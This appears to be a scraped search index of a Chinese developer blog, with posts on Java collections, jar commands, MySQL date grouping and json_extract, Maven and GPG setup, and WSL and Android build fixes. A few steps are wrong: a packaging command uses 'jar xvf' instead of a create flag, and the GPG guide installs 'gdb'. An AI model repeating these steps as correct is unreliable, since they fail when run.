https://www.diyiziti.com/Builder/446 font = ImageFont.truetype(u\"D://MobileFile/潇洒手写体.ttf\", 20, encoding=\"unic\") # 设置字体 render_index = 0 for x in range(width): for y in range(height): pixel = img.getpixel((x, y)) draw.text((x * 24 + 2, y * 24 + 2), name[render_index], pixel, font) # 再指定的地方使用文字替代之前的纯色 render_index = (render_index + 1) % len(name) new_img.save(save) 依然以小黄人为例，来看下生成的效果如何 从上面的图片来看，和前面java版输出差不离，有兴趣的小伙伴动手搞起来吧；我是一灰灰，觉得不错的小伙伴给个收藏、点赞、评论支持一下呗 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2022/05/26/220526-程序员的浪漫-用她的名字作画Python版/"},{"title":"220517-实战小技巧19:List转Map List的几种姿势","text":"今天介绍一个实用的小知识点，如何将List转为Map&lt;Object, List&lt;Object&gt;&gt; 1. 基本写法最开始介绍的当然是最常见、最直观的写法，当然也是任何限制的写法 1234567891011121314151617// 比如将下面的列表，按照字符串长度进行分组List&lt;String&gt; list = new ArrayList&lt;&gt;();list.add(\"hello\");list.add(\"word\");list.add(\"come\");list.add(\"on\");Map&lt;Integer, List&lt;String&gt;&gt; ans = new HashMap&lt;&gt;();for(String str: list) { List&lt;String&gt; sub = ans.get(str.length()); if(sub == null) { sub = new ArrayList&lt;&gt;(); ans.put(str.length(), sub); } sub.add(str);}System.out.println(ans); 对于jdk8+，上面for循环中的内容可以利用Map.computeIfAbsent来替换，具体写法如下 123for (String str : list) { ans.computeIfAbsent(str.length(), k -&gt; new ArrayList&lt;&gt;()).add(str);} 当然既然已经是jdk1.8了，借助Stream的流处理，可以将上面的更一步进行简化，如下 1Map&lt;Integer, List&lt;String&gt;&gt; ans = list.stream().collect(Collectors.groupingBy(String::length)); 2. 通用方法上面是针对特定的列表，针对业务进行开发转换，那么我们接下来尝试构建一个通用的工具类 这里我们主要借助的知识点就是泛型，一个重要的点就是如何获取Map中的key 对于jdk &lt; 1.8的写法，通过接口来定义实现key的获取姿势 123456789101112131415public static &lt;K, V&gt; Map&lt;K, List&lt;V&gt;&gt; toMapList(List&lt;V&gt; list, KeyFunc&lt;V, K&gt; keyFunc) { Map&lt;K, List&lt;V&gt;&gt; result = new HashMap&lt;&gt;(); for (V item: list) { K key = keyFunc.getKey(item); if (!result.containsKey(key)) { result.put(key, new ArrayList&lt;&gt;()); } result.get(key).add(item); } return result;}public static interface KeyFunc&lt;T, K&gt; { K getKey(T t);} 使用demo如下 1234567891011121314public static void main(String[] args) { List&lt;String&gt; list = new ArrayList&lt;&gt;(); list.add(\"hello\"); list.add(\"word\"); list.add(\"come\"); list.add(\"on\"); Map&lt;Integer, List&lt;String&gt;&gt; res = toMapList(list, new KeyFunc&lt;String, Integer&gt;() { @Override public Integer getKey(String s) { return s.length(); } }); System.out.println(res);} 接下来再看一下jdk1.8之后的写法，结合stream + 函数方法来实现 1234public static &lt;K, V&gt; Map&lt;K, List&lt;V&gt;&gt; toMapList(List&lt;V&gt; list, Function&lt;V, K&gt; func) { return list.stream().collect(Collectors.groupingBy(func));}` 其对应的使用方式则如下 123456789public static void main(String[] args) { List&lt;String&gt; list = new ArrayList&lt;&gt;(); list.add(\"hello\"); list.add(\"word\"); list.add(\"come\"); list.add(\"on\"); Map&lt;Integer, List&lt;String&gt;&gt; res = toMapList(list, (Function&lt;String, Integer&gt;) String::length); System.out.println(res);} 3. 工具类上一节介绍了基于泛型 + jdk8 Stream + 函数方法来实现通用转换工具类的实现姿势，接下来我们小结一下，输出一个适用于1.8之后的工具类 123456789101112131415161718192021222324252627/** * List&lt;V&gt;转换为Map&lt;K, List&lt;V&gt;&gt; 特点在于Map中的value，是个列表，且列表中的元素就是从原列表中的元素 * * @param list * @param func 基于list#item生成Map.key的函数方法 * @param &lt;K&gt; * @param &lt;V&gt; * @return */public static &lt;K, V&gt; Map&lt;K, List&lt;V&gt;&gt; toMapList(List&lt;V&gt; list, Function&lt;V, K&gt; func) { return list.stream().collect(Collectors.groupingBy(func));}/** * List&lt;I&gt;转换为Map&lt;K, List&lt;V&gt;&gt; 特点在于Map中的value是个列表，且列表中的元素是由list.item转换而来 * * @param list * @param keyFunc 基于list#item生成的Map.key的函数方法 * @param valFunc 基于list#item转换Map.value列表中元素的函数方法 * @param &lt;K&gt; * @param &lt;I&gt; * @param &lt;V&gt; * @return */public static &lt;K, I, V&gt; Map&lt;K, List&lt;V&gt;&gt; toMapList(List&lt;I&gt; list, Function&lt;I, K&gt; keyFunc, Function&lt;I, V&gt; valFunc) { return list.stream().collect(Collectors.groupingBy(keyFunc, Collectors.mapping(valFunc, Collectors.toList())));} 4.guava HashMultimap扩展知识点最后再介绍一个扩展知识点，Gauva工具包中提供了一个HashMultimap的工具类，他的使用姿势和我们平常的Map并无差别，但是需要在注意的是，它的value是个集合 1234567891011List&lt;String&gt; list = new ArrayList&lt;&gt;();list.add(\"hello\");list.add(\"word\");list.add(\"come\");list.add(\"on\");list.add(\"on\");HashMultimap&lt;Integer, String&gt; map = HashMultimap.create();for (String item: strList) { map.put(item.length(), item);}System.out.println(map); 实际输出如下，验证了value实际上是个集合（on只有一个，如果是我们上面的工具类，会输出两个） 1{2=[on], 4=[word, come], 5=[hello]} 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2022/05/17/220517-实战小技巧19-List转Map-List的几种姿势/"},{"title":"211228-Jar文件提取与查看","text":"最近遇到一个奇怪的问题，一个jar包无法解压，直接使用jar xvf xxx.jar没有任何响应 因为实际想看的只是jar包中的某个class文件，基于此可以通过 jar tf 查看文件列表，在通过 jar xf xxx.jar xxxfile的方式来解压指定文件来实现目的 接下来记录一下jar包的几个操作case 1. jar包生成直接通过jar命令可以非常简单的将class文件打包到一个jar中 一个简单的java类 12345public class Hello { public static void main(String[] args) { System.out.println(\"hello world\"); }} 打包jar命令 12javac Hello.javajar xvf Hello.jar Hello.class 直接使用上面这种打包，会有一个问题，当jar包中，有多个class文件存在main方法时，会提示没有主清单属性 12$ java -jar Hello.jar没有主清单属性 主要原因就是在清单文件MANIFEST.MF中，没有指定主类 指定主类 123Manifest-Version: 1.0Created-By: 1.8.0_171 (Oracle Corporation)Main-Class: Hello 打包命令如下（下面新增了一个Wel.java，源码就不说了） 1jar cvfm B.jar MAINFEST.MF -c Hello.class Wel.class 2. jar文件列表查看查看jar中有哪些文件，除了直接使用vim之外，还可考虑通过下面的命令 123456# tf 来查看jar包中的文件列表$ jar tf B.jarMETA-INF/META-INF/MANIFEST.MFHello.classWel.class 使用tf进行查看，就可以结合 grep 来过滤指定的文件 3. 指定文件提取对于jar文件整个解压，可以直接使用 1jar xvf B.jar 当我们只希望提取jar包中的某个文件时，可以在后面添加需要提取的文件路径 12# 指定文件提取jar xf B.jar Hello.class 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2021/12/28/211228-Jar文件提取与查看/"},{"title":"220707-MySql按时、天、周、月进行数据统计","text":"最近遇到一个统计的需求场景，针对db中的数据，看一下每天的数据量情况，由于DB中时间字段采用的是int存的时间戳，所以最开始想到的是直接对时间进行按天取整，然后再Group统计数据； 除此之外，使用DATE_FORMAT函数来处理可能是更简洁的方法了，下面分别介绍下两种方式 1. 时间取整方式假设现在有一个user表，其中create_time 为 int类型的时间戳，此时我们需要统计每天的新增用户数，第一种方式就是将create_time转换为天为单位的整数，然后group分组之后计数即可 对应的sql如下 1select floor(create_time / 86400) as c, count(*) from `user` group by c 使用上面这种方式虽然可以统计出结果，但是显示并不友好，如上面这个c实际上是距离标准起始时间过去的天数；无法直观看到每天的数量情况 2. data_format方式接下来再介绍一下根据日期格式化这个函数来实现数据统计 函数说明 这个函数通常接收两个参数，使用姿势形如 1DATE_FORMAT(date,format) date: 日期 format: 规定日期/时间的输出格式 注意上面的date，要求是日期格式，可我们现在的数据是int类型，怎么整？ 先通过from_unixtime函数来转换为日期，然后再使用data_format来格式化分组，这样就可行了 比如按天统计的sql可以如下 1select date_format(from_unixtime(create_time), '%Y-%m-%d') today, count(*) as cnt from user group by today 返回结果形如 today cnt 2022-07-02 6 2022-07-03 4 2022-07-04 4 2022-07-05 3 2022-07-06 2 2022-07-07 1 如果需要按周统计，也很方便，将format改成 %Y-%u 1select date_format(from_unixtime(create_time), '%Y-%u') today, count(*) as cnt from user group by today 返回结果形如 today cnt 2022-22 27 2022-23 52 2022-24 28 2022-25 33 2022-26 39 2022-27 10 同样按年统计，则将format改成%Y即可 下面给出format对应的取值说明 格式 描述 %a 缩写星期名 %b 缩写月名 %c 月，数值 %D 带有英文前缀的月中的天 %d 月的天，数值(00-31) %e 月的天，数值(0-31) %f 微秒 %H 小时 (00-23) %h 小时 (01-12) %I 小时 (01-12) %i 分钟，数值(00-59) %j 年的天 (001-366) %k 小时 (0-23) %l 小时 (1-12) %M 月名 %m 月，数值(00-12) %p AM 或 PM %r 时间，12-小时（hh:mm:ss AM 或 PM） %S 秒(00-59) %s 秒(00-59) %T 时间 24-小时 (hh:mm:ss) %U 周 (00-53) 星期日是一周的第一天 %u 周 (00-53) 星期一是一周的第一天 %V 周 (01-53) 星期日是一周的第一天，与 %X 使用 %v 周 (01-53) 星期一是一周的第一天，与 %x 使用 %W 星期名 %w 周的天 （0=星期日 6=星期六） %X 年，其中的星期日是周的第一天，4 位，与 %V 使用 %x 年，其中的星期一是周的第一天，4 位，与 %v 使用 %Y 年，4 位 %y 年，2 位 日期不连续场景补充说明评论大佬指出上面这种统计方式有一个缺陷，当某一天没有数据时，会导致统计出来的数据不连续，简单来讲，现在8.1号3号有数据，但是2号没有数据，则统计出来的形如 122022-08-01 102022-08-03 20 那么我们能实现缺的日期自动补零么？ 下面给一个供大家参考的方法 12345SELECT data.day, IFNULL(data.count, 0) as cnt, day_list.day as date from (select DATE_FORMAT(create_time, '%Y-%m-%d') day, count(id) count from u1 GROUP BY day) dataright join (SELECT @date := DATE_ADD(@date, interval - 1 day) day from (SELECT @date := DATE_ADD(CURDATE(), interval 1 day) from u1) days limit 30) day_list on day_list.day = data.day 上面这个sql分了两部分，先看后面这一部分 12-- 下面这个主要是构建一个日期表day_list, 只有一个成员 day, 取值为今天，昨天，前天，一直往前; 要求 u1 这个表的数据超过30条SELECT @date := DATE_ADD(@date, interval - 1 day) day from (SELECT @date := DATE_ADD(CURDATE(), interval 1 day) from u1) days limit 30 其中u1是一个数据行数超过30的表，执行之后实际输出如下 前面的部分则是我们上面介绍的数据统计 12-- 下面这个则是统计sql，将其余日期表进行关联select DATE_FORMAT(create_time, '%Y-%m-%d') day, count(id) count from u1 GROUP BY day 两个表join之后，对于null的数据自动补0，所以结果如下 mysql查询日期内的所有日期代码 - 込戲冭氵罙 - 博客园 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2022/07/07/220707-MySql按时、天、周、月进行数据统计/"},{"title":"221122-Maven私服配置Downloading from maven-default-http-blocker问题解决方法","text":"最近配置maven的私服地址，发现私服里的包无法下载，一直报Downloading from maven-default-http-blocker: http://0.0.0.0/com的异常 从异常描述看，主要问题就是这个域名解析为了http://0.0.0.0 主要的原因在于在maven的 3.8.1 版本开始，maven禁止从http协议的仓库地址下载依赖 官方描述可以参考: https://maven.apache.org/docs/3.8.1/release-notes.html#cve-2021-26291 官方给出的解决方案 1234567891011How to fix when I get a HTTP repository blocked?If the repository is defined in your pom.xml, please fix it in your source code.If the repository is defined in one of your dependencies POM, you'll get a message like:[ERROR] Failed to execute goal on project test: Could not resolve dependencies for project xxx: Failed to collect dependencies at my.test:dependency:version -&gt; my.test.transitive:transitive:version: Failed to read artifact descriptor for my.test.transitive:transitive:jar:version: Could not transfer artifact my.test.transitive:transitive:pom:version from/to maven-default-http-blocker (http://0.0.0.0/): Blocked mirror for repositories: [blocked-repository-id (http://blocked.repository.org, default, releases+snapshots)]Options to fix are:upgrade the dependency version to a newer version that replaced the obsolete HTTP repository URL with a HTTPS one,keep the dependency version but define a mirror in your settings. 我们下面给出的解决方案自然就有俩个 配置https的私服地址 降级maven版本，找一个3.8.1之前的版本 这里我们选择第二个方案，版本降级，到官网下载对应的包 官网地址： maven官网 因为我们需要历史版本，需要拉到页面最下面，从下图指定的位置进行获取 这里也直接给出对应的地址： maven 历史包下载地址 选在3.6.3版本作为自己本地的maven，重新配置一下之后就可以了 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2022/11/22/221122-Maven私服配置Downloading-from-maven-default-http-blocker问题解决方法/"},{"title":"221125-Android Studio 报错(Installed Build Tools revision 3x.0.0 is corrupted)解决方法","text":"由于谷歌应用市场要求编译sdk最低为31，最近升级却发现一直有问题，重复卸载、下载好几次，提示都一样 编译报错：Installed Build Tools revision 31.0.0 is corrupted. Remove and install again using the SDK Manager 下面的解决方案适用于win系统 问题的主要原因在于 SDK构建工具31上缺少2个文件，即dx.bat dx.jar ，所以我们主动给它补上 进入tools目录 C:\\Users\\你自己的用户名\\AppData\\Local\\Android\\Sdk\\build-tools\\31.0.0 找到 d8.bat，拷贝一份出来，重命名为 dx.bat 接着进入当前目录的 lib 目录下 找到 d8.jar，同样拷贝一份出来，重命名为 dx.jar 如果不知道怎么进入AppData目录，可以通过控制台 搜索 -&gt; PowserShell 在终端输入: start '.\\AppData\\Local\\Android\\Sdk\\build-tools\\' 以上改完之后，再重新build一下项目，问题解决 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2022/11/25/221125-Android-Studio-报错-Installed-Build-Tools-revision-3x-0-0-is-corrupted-解决方法/"},{"title":"221121-win11安装ubuntu子系统图解示例","text":"本文记录win11安装ubuntu子系统的全过程 手把手教程点击win11的搜索，输入 启用或关闭Windows功能 在弹框中勾中以下选项 接下来直接通过win应用市场进行安装 点击搜索，输入 microsoft store 在应用市场中搜索ubuntu并下载，完毕之后点击打开即可 若执行ubuntu之后发现报错，提示 WslRegisterDistribution failed with error: 0x800701bc 主要原因是WSL版本由原来的WSL1升级到WSL2后，内核没有升级，前往微软WSL官网下载安装适用于 x64 计算机的最新 WSL2 Linux 内核更新包即可 因此需要下载安装一下，下载地址: wsl_update_x64.msi 当上面这个安装之后，再次执行ubuntu，将正常启动ubuntu子系统了 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2022/11/21/221121-win11安装ubuntu子系统图解示例/"},{"title":"220809-实战小技巧20：巧用函数方法实现二维数组遍历","text":"对于数组遍历，基本上每个开发者都写过，遍历本身没什么好说的，但是当我们在遍历的过程中，有一些复杂的业务逻辑时，将会发现代码的层级会逐渐加深 如一个简单的case，将一个二维数组中的偶数找出来，保存到一个列表中 二维数组遍历，每个元素判断下是否为偶数，很容易就可以写出来，如 123456789101112public void getEven() { int[][] cells = new int[][]{{1, 2, 3, 4}, {11, 12, 13, 14}, {21, 22, 23, 24}}; List&lt;Integer&gt; ans = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; cells.length; i ++) { for (int j = 0; j &lt; cells[0].length; j++) { if ((cells[i][j] &amp; 1) == 0) { ans.add(cells[i][j]); } } } System.out.println(ans);} 上面这个实现没啥问题，但是这个代码的深度很容易就有三层了；当上面这个if中如果再有其他的判定条件，那么这个代码层级很容易增加了；二维数组还好，如果是三维数组，一个遍历就是三层；再加点逻辑，四层、五层不也是分分钟的事情么 那么问题来了，代码层级变多之后会有什么问题呢？ 只要代码能跑，又能有什么问题呢？！ 1. 函数方法消减代码层级由于多维数组的遍历层级天然就很深，那么有办法进行消减么？ 要解决这个问题，关键是要抓住重点，遍历的重点是什么？获取每个元素的坐标！那么我们可以怎么办？ 定义一个函数方法，输入的就是函数坐标，在这个函数体中执行我们的遍历逻辑即可 基于上面这个思路，相信我们可以很容易写一个二维的数组遍历通用方法 1234567public static void scan(int maxX, int maxY, BiConsumer&lt;Integer, Integer&gt; consumer) { for (int i = 0; i &lt; maxX; i++) { for (int j = 0; j &lt; maxY; j++) { consumer.accept(i, j); } }} 主要上面的实现，函数方法直接使用了JDK默认提供的BiConsumer，两个传参，都是int 数组下表；无返回值 那么上面这个怎么用呢？ 同样是上面的例子，改一下之后，如 12345678910public void getEven() { int[][] cells = new int[][]{{1, 2, 3, 4}, {11, 12, 13, 14}, {21, 22, 23, 24}}; List&lt;Integer&gt; ans = new ArrayList&lt;&gt;(); scan(cells.length, cells[0].length, (i, j) -&gt; { if ((cells[i][j] &amp; 1) == 0) { ans.add(cells[i][j]); } }); System.out.println(ans);} 相比于前面的，貌似也就少了一层而已，好像也没什么了不起的 但是，当数组变为三维、四维、无维时，这个改动的写法层级都不会变哦 2. 遍历中return支持前面的实现对于正常的遍历没啥问题；但是当我们在遍历过程中，遇到某个条件直接返回，能支持么？ 如一个遍历二维数组，我们希望判断其中是否有偶数，那么可以怎么整？ 仔细琢磨一下我们的scan方法，希望可以支持return，主要的问题点就是这个函数方法执行之后，我该怎么知道是继续循环还是直接return呢? 很容易想到的就是执行逻辑中，添加一个额外的返回值，用于标记是否中断循环直接返回 基于此思路，我们可以实现一个简单的demo版本 定义一个函数方法，接受循环的下标 + 返回值 1234@FunctionalInterfacepublic interface ScanProcess&lt;T&gt; { ImmutablePair&lt;Boolean, T&gt; accept(int i, int j);} 循环通用方法就可以相应的改成 1234567891011public static &lt;T&gt; T scanReturn(int x, int y, ScanProcess&lt;T&gt; func) { for (int i = 0; i &lt; x; i++) { for (int j = 0; j &lt; y; j++) { ImmutablePair&lt;Boolean, T&gt; ans = func.accept(i, j); if (ans != null &amp;&amp; ans.left) { return ans.right; } } } return null;} 基于上面这种思路，我们的实际使用姿势如下 123456789101112@Testpublic void getEven() { int[][] cells = new int[][]{{1, 2, 3, 4}, {11, 12, 13, 14}, {21, 22, 23, 24}}; List&lt;Integer&gt; ans = new ArrayList&lt;&gt;(); scanReturn(cells.length, cells[0].length, (i, j) -&gt; { if ((cells[i][j] &amp; 1) == 0) { return ImmutablePair.of(true, i + \"_\" + j); } return ImmutablePair.of(false, null); }); System.out.println(ans);} 上面这个实现可满足我们的需求，唯一有个别扭的地方就是返回，总有点不太优雅；那么除了这种方式之外，还有其他的方式么？ 既然考虑了返回值，那么再考虑一下传参呢？通过一个定义的参数来装在是否中断以及返回结果，是否可行呢？ 基于这个思路，我们可以先定义一个参数包装类 123456789101112131415161718public static class Ans&lt;T&gt; { private T ans; private boolean tag = false; public Ans&lt;T&gt; setAns(T ans) { tag = true; this.ans = ans; return this; } public T getAns() { return ans; }}public interface ScanFunc&lt;T&gt; { void accept(int i, int j, Ans&lt;T&gt; ans)} 我们希望通过Ans这个类来记录循环结果，其中tag=true，则表示不用继续循环了，直接返回ans结果吧 与之对应的方法改造及实例如下 12345678910111213141516171819202122public static &lt;T&gt; T scanReturn(int x, int y, ScanFunc&lt;T&gt; func) { Ans&lt;T&gt; ans = new Ans&lt;&gt;(); for (int i = 0; i &lt; x; i++) { for (int j = 0; j &lt; y; j++) { func.accept(i, j, ans); if (ans.tag) { return ans.ans; } } } return null;} public void getEven() { int[][] cells = new int[][]{{1, 2, 3, 4}, {11, 12, 13, 14}, {21, 22, 23, 24}}; String ans = scanReturn(cells.length, cells[0].length, (i, j, a) -&gt; { if ((cells[i][j] &amp; 1) == 0) { a.setAns(i + \"_\" + j); } }); System.out.println(ans);} 这样看起来就比前面的要好一点了 实际跑一下，看下输出是否和我们预期的一致； 3.小结到此一个小的技巧就分享完毕了，各位感兴趣的小伙伴可以关注我的公众号“一灰灰blog” 最近正在整理的 * 分布式设计模式综述 | 一灰灰Learning 欢迎各位大佬点评 万字总结：分布式系统的38个知识点 - 掘金 万字详解：MySql,Redis,Mq,ES的高可用方案解析 - 掘金 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2022/08/09/220809-实战小技巧20-巧用函数方法实现二维数组遍历/"},{"title":"220602-Ubuntu终端实现Maven中央仓库包上传","text":"最近换了个win10的笔记本，发布jar到中央仓库就得重新配置下了，特此记录一下，在win10的ubuntu终端界面下，如果我们希望实现发布jar包到中央仓库，需要的完整环境安装配置教程 主要内容与之前介绍的没有太大改动，因为账号相关的已经有了，这里将直接跳过；前文超链 201128-Maven 中央仓库提交Jar包全程指南 - 一灰灰Blog 1. maven环境安装既然是打包上传，那么maven环境得有，而maven则又需要借助jdk，所以第一步就是安装jdk 1sudo apt-get install openjdk-8-jdk 安装完毕之后，执行下java命令确认下是否安装准确 第二步就是安装maven了 直接到官网找对应得下载包 1234567891011121314# 1. 下载wget https://dlcdn.apache.org/maven/maven-3/3.8.5/binaries/apache-maven-3.8.5-bin.tar.gz# 2. 解压tar -zxvf apache-maven-3.8.5-bin.tar.gz# 3. 配置环境变量vim ~/.profile# 注意下面得地址，根据实际的进行替换export MAVEN_HOME=\"/home/yihui/soft/apache-maven-3.8.5/bin\"export PATH=$PATH:$MAVEN_HOME## 4. 让配置生效source ~/.profile 到此maven就算配置完成了，可以通过执行 mvn 命令来验证下是否ok 2. gpg配置相比于之前因为mac系统老旧安装这个折腾很久来说，这次安装可以说无比顺畅了，直接apt即可 1sudo apt-get install gdb 安装完之后，就是配置密钥了 123# 生成密钥对# 输入用户名 + 邮箱，请记住这个密码，后面上传jar包的时候会用到gpg --gen-key 注意：上面这个key的密钥非常重要，以后每次上传包进行签名的就是它 查看本地密钥 1gpg --list-keys 正常返回结果如下 1234pub rsa3072 2022-06-02 [SC] [expires: 2024-06-01] xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx （&lt;- 注意这个就是我们需要上传的公钥id）uid yihuihui &lt;yihuihuiyi@gmail.com&gt;sub rsa3072 2022-06-02 [E] [expires: 2024-06-01] 接下来就是上传公钥id到密钥服务器 12345## 上传公钥gpg --keyserver hkp://keyserver.ubuntu.com:11371 --send-keys 公钥ID## 查看公钥上传情况gpg --keyserver hkp://keyserver.ubuntu.com:11371 --recv-keys 公钥ID 上传成功之后，查看返回如下 123gpg: key 274D20CF942E6787: &quot;yihuihui &lt;yihuihuiyi@gmail.com&gt;&quot; not changedgpg: Total number processed: 1gpg: unchanged: 1 4. 配置.m2/setting.xml最后剩下的配置就是mvn上传仓库的账号信息 1234567&lt;servers&gt; &lt;server&gt; &lt;id&gt;ossrh&lt;/id&gt; &lt;username&gt;user&lt;/username&gt; &lt;password&gt;password&lt;/password&gt; &lt;/server&gt;&lt;/servers&gt; 5. 上传到这里就可以愉快的发布包到maven中央仓库了，当然前提是对应的项目已经配置好了，这里以 https://github.com/liuyueyi/quick-media 为例（若希望知道具体的pom文件应该怎么配的，可以翻看文章头的博文，或者直接看左边这个项目的pom文件） 12# 打包上传mvn clean deploy -DskipTests=true -P release 执行上面打包上传之后，却发现没有提示输gpg密码的地方，果不其然最后的上传结果也是失败，提示信息如下 1234567[ERROR] Failed to execute goal org.apache.maven.plugins:maven-gpg-plugin:1.6:sign (sign-artifacts) on project quick-media: Exit code: 2 -&gt; [Help 1][ERROR][ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[ERROR] Re-run Maven using the -X switch to enable full debug logging.[ERROR][ERROR] For more information about the errors and possible solutions, please read the following articles:[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoExecutionException 当然错误原因我们也能猜测到，但是怎么解决呢? stackoverflow 上有一个类似的提问其中一个回答可以解决这个问题 failed to execute goal org.apache.maven.plugins:maven-gpg-plugin 解决方法选的是第二个回答，执行下面这个命令 1export GPG_TTY=$(tty) 再次执行上传，就没啥问题了 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2022/06/02/220602-Ubuntu终端实现Maven中央仓库包上传/"},{"title":"220425-MySql之json_extract函数处理json字段","text":"在db中存储json格式的数据，相信大家都或多或少的使用过，那么在查询这个json结构中的数据时，有什么好的方法么？取出String之后再代码中进行解析？ 接下来本文将介绍一下Mysql5.7+之后提供的json_extract函数，可以通过key查询value值 1. 使用方式数据存储的数据是json字符串，类型为我们常用的varchar即可 语法: 1JSON_EXTRACT(json_doc, path[, path] …) 若json字符串非数组时，可以通过$.字段名来表示查询对应的value 2.使用演示创建一个测试的表 12345CREATE TABLE `json_table` ( `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '主键id', `val` json DEFAULT NULL COMMENT 'json字符串', PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4; 插入几条数据 12insert into `json_table` values (1, '{\"name\": \"一灰灰blog\", \"age\": 18}');insert into `json_table` values (2, '{\"name\": \"一灰灰blog\", \"site\": \"https://blog.hhui.top\"}'); 查询json串中的name，如下 1234567mysql&gt; select json_extract(`val`, '$.name') from `json_table`;+-------------------------------+| json_extract(`val`, '$.name') |+-------------------------------+| \"一灰灰blog\" || \"一灰灰blog\" |+-------------------------------+ 如果查询的key不在json串中，返回的是null，而不是抛异常 1234567mysql&gt; select json_extract(`val`, '$.name') as `name`, json_extract(`val`, '$.site') as `site` from `json_table`;+-----------------+-------------------------+| name | site |+-----------------+-------------------------+| \"一灰灰blog\" | NULL || \"一灰灰blog\" | \"https://blog.hhui.top\" |+-----------------+-------------------------+ 接下来再看一下如果为json数组，怎么整 123456789mysql&gt; insert into `json_table` values (3, '[{\"name\": \"一灰灰\", \"site\": \"https://spring.hhui.top\"}]');mysql&gt; select json_extract(`val`, '$[0].name') from `json_table` where id = 3;+----------------------------------+| json_extract(`val`, '$[0].name') |+----------------------------------+| \"一灰灰\" |+----------------------------------+ 除了在查询结果中使用json_extract之外，也可以在查询条件中使用它 1234567mysql&gt; select * from `json_table` where json_extract(`val`, '$.name') = '一灰灰blog';+----+------------------------------------------------------------+| id | val |+----+------------------------------------------------------------+| 1 | {\"age\": 18, \"name\": \"一灰灰blog\"} || 2 | {\"name\": \"一灰灰blog\", \"site\": \"https://blog.hhui.top\"} |+----+------------------------------------------------------------+ 3. 小结本文主要介绍json_extract函数的使用姿势，用于解析字段内value为json串的场景 基本使用姿势 json对象：json_extract(‘db字段’, ‘$.json串key’) json数组：json_extract(‘db字段’, ‘$[数组下标].json串key’) 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2022/04/25/220425-MySql之json-extract函数处理json字段/"},{"title":"220808-纯java实现相片素描化","text":"修图可以说是国内技术领先的一大特点了，现在的图片处理技术可以说是非常厉害了，比如老旧照片修复，自动美化，各种滤镜，自动抠图等等，结合高大上的机器学习，功能越强大，感觉对于我这种图像门外汉来说，门槛也响应的越来越高了 那么有什么简单的方式，可以实现照片的处理嘛，接下来介绍一个纯java的工具包，来做图片处理 1.实例演示图片转素描效果首先我们来看一下具体的效果，在项目中添加依赖 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;jitpack.io&lt;/id&gt; &lt;url&gt;https://jitpack.io&lt;/url&gt; &lt;/repository&gt;&lt;/repositories&gt;&lt;dependency&gt; &lt;groupId&gt;com.github.liuyueyi&lt;/groupId&gt; &lt;artifactId&gt;java-jhlabs&lt;/artifactId&gt; &lt;!-- replace by newest version --&gt; &lt;version&gt;1.0&lt;/version&gt;&lt;/dependency&gt;···实用姿势```javaprivate static void toSketch(String imgPath, String output) throws IOException { BufferedImage src = ImageIO.read(Objects.requireNonNull(Img2SketchTest.class.getClassLoader().getResourceAsStream(imgPath))); src = ImageUtils.convertImageToARGB(src); //图像灰度化 PointFilter grayScaleFilter = new GrayscaleFilter(); BufferedImage grayScale = new BufferedImage(src.getWidth(), src.getHeight(), src.getType()); grayScaleFilter.filter(src, grayScale); //灰度图像反色 